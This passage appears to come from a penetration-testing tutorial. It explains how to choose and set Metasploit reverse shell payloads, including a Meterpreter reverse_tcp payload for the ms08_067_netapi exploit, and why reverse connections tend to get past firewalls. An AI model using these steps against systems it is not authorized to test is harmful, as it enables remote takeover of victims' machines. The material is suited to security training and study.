- img_proc: false
  md: 'Or you can type "***set payload***" and hit the tab key twice. This will prompt
    Metasploit to ask you if you want to see all the available payloads:


    Most of the payloads are laid out in the format of ''***Operating System/Shell
    Type***'' as shown below:


    +   - set payload/osx/x86/shell_reverse_tcp

    - set payload/linux/x64/shell_reverse_tcp

    - set payload/windows/shell_reverse_tcp

    - set payload/windows/meterpreter/reverse_tcp


    Simply select the correct OS for your target and then pick the payload you want.


    The most popular types of payloads are shells, either a regular remote shell or
    a Meterpreter shell.


    If we just want a remote terminal shell to remotely run commands, use the standard
    shell. If you want the capability to manipulate the session and run extended commands
    then you will want the Meterpreter shell (which we will discuss in further detail
    in the next chapter).


    There are different types of ways that the payloads communicate back to the attacking
    system. I usually prefer reverse_tcp shells as once they are executed on the target
    system, they tell the attacking machine to connect back out to our Kali system.


    The big advantage to this is that with the victim machine technically "initiating"
    the connection out, it usually is not blocked by the Firewall, as a connection
    trying to come in from the outside most likely will.


    Once we know what payload we want to use, we set it using the "set" command.


    6. So for our example let''s use a Meterpreter shell for a Windows system and
    have it connect back to us via TCP:


    ```

    msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp

    payload => windows/meterpreter/reverse_tcp

    ```


    Now that our payload is set, we just need to set the options for it.


    # Setting Payload Options


    Payloads have options that are set in the exact same way that the exploit is set.
    Usually payload settings include the IP address and port for the exploit to connect
    out to.


    And these too are set with the "set" command.


    7. Type "***show options***" to see what settings the payload needs:'
